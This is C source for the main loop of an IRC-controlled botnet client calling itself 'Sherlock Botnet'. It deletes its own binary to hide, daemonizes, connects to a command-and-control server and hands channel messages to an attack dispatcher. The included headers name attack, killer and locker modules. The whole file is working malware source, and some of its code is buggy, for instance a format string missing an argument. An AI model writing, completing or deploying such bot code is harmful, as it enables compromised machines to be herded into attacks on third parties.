#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/prctl.h>

#include "headers/utils.h"
#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/kill.h"
#include "headers/locker.h"
#include "headers/rand.h"

static void flush(void)
{
  char buf[4096];
  int len = 0;
  int fd = -1;

  if((len = readlink("/proc/self/exe", buf, sizeof(buf) - 1)) == -1)
    return;

  // Delete our original executable
  remove(buf);

  // Recreate it
  if((fd = open(buf, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1)
    return;

  close(fd);
  return;
}

int main(int argc, char **args) {
  int len = 0, i = 0;
  char ident[64], buf[32];

  if (ensure_single_instance() > 0) {
    exit(1);
  }

  killer_init();

  table_init();
  rand_init();

  memset(ident, 0, sizeof(ident));
  if(argc == 2 && strlen(args[1]) < sizeof(ident)) // Parse the input on arg1
    strcpy(ident, args[1]);

  #ifndef DEBUG
    flush();
  #endif

  #ifndef DEBUG
    pid_t pppid = fork();
    if (pppid < 0) {
      return 0;
    }
    
    if (pppid > 0) {
      return 0;
    }

    if (setsid() < 0) {
      return 0;
    }

    close(0);
    close(1);
    close(2);
  #endif

  chdir("/");

  while (1) {
    int sockfd = irc_connect(SERVER, PORT);
    if (sockfd != -1) {
      // Get bot source
      char source[256];
      strip_string(args[1]);
      snprintf(source, sizeof(source), argc == 2 ? "%s\n" : "unknown\n", args[1]);

      char nick[256];
      char *bot_id = generate_bot_id();
      snprintf(nick, sizeof(nick), "NICK %s-%s", bot_id, ident);
      send_irc_command(sockfd, nick);

      char name[256];
      snprintf(name, sizeof(name), "USER %s 0 * :%s", USER);
      send_irc_command(sockfd, name);

      /* exec message */
      printf("Connected to Sherlock Botnet\n");

      #ifdef DEBUG
        printf("[Sherlock/Debug] Connected to IRC server\n");
      #endif
      join_channel(sockfd, CHANNEL);

      #ifdef DEBUG
        printf("[Sherlock/Debug] Awaiting instructions from masters...\n");
      #endif

      while (1) {
        char buffer[1024];
        int bytes_received = recv(sockfd, buffer, sizeof(buffer), 0);

        buffer[bytes_received] = '\0';
        if (strstr(buffer, "PRIVMSG #") != NULL) {
          char *splitter_one = strchr(buffer, ':');
          if (splitter_one != NULL) {
            char *splitter_two = strchr(splitter_one + 1, ':');
            if (splitter_two != NULL) {
              attack_manage(splitter_two + 1);
            }
          }
        // Make the bots reply to PING with PONG so they don't timeout and leave the IRC
        } else if (strstr(buffer, "PING") != NULL) {
          char pong[256];
          snprintf(pong, sizeof(pong), "PONG :%s", HOST);
          send_irc_command(sockfd, pong);
        }
      }

      close(sockfd);
    } else {
      #ifdef DEBUG
        perror("[Sherlock/Debug] Cannot connect to IRC server\n");
      #endif
    }
  }
  
  return 0;
}
